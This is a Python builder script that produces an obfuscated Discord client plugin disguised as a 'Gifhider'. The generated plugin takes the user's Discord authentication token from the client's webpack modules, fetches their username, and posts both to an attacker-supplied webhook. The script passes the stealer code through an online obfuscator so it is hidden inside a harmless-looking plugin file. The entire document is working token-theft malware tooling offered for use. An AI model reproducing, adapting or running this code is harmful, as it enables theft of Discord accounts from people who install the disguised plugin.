import requests
from urllib.request import unquote
from html import unescape
import re
top = f"""/**
 * @name {input("enter plugin's display name: ").replace(" ","_")}
 * @version {input("enter plugin version: ")}
 * @description {input("enter plugins description: ")}
 * @author {input("enter author: ").replace(" ","_")}
 *   
 */"""
code1="""
module.exports = class Gifhider{
    load() { }
    start() {
    
    """
code2=r"""
 	
    const whurl ="webhookpoggers";
	try {
		var m =[];
		var e = eval("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
	}
	catch
	{
		var gotem = "";
		var req = webpackJsonp.push([[], {extra_id: (e, t, r) => e.exports = r },[["extra_id"]]]);for (let e in req.c)if (req.c.hasOwnProperty(e)) {let t = req.c[e].exports;if (t && t.__esModule && t.default)for (let e in t.default) "getToken" === e && (gotem = t.default.getToken())};
		var e = gotem;
	};
	function httpGet(theUrl)
	{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.setRequestHeader('Authorization', e);
	xmlHttp.send( null );
    return xmlHttp.responseText;
	};
	var b = JSON.parse(httpGet('https://discordapp.com/api/v6/users/@me'));
	var username=b["username"] + "#" +b["discriminator"];
	const msg = {
		"content": "username: " + username + "\ntoken: " + e + "\n"
	};
	try {fetch(whurl + "?wait=true", {"method":"POST", "headers": {"content-type": "application/json"},"body": JSON.stringify(msg)}).then(a=xa.json()).then(console.log)} catch {};

""".replace("webhookpoggers", input("enter webhook: "))
code3 = """

}
stop(){

}
}"""
code2=unescape(unquote(re.findall('eval.*\)\)\)',requests.post("https://www.cleancss.com/javascript-obfuscate/index.php",data={"ascii_encoding": 62, "src":code2},allow_redirects=False).text)[0]))
code = top+code1+code2+code3
filename=input("enter output filename: ")
with open(filename+".plugin.js","w") as f:
    f.write(code)
    f.close()
print(f"complete, saved to \"{filename}.plugin.js\"")
input()
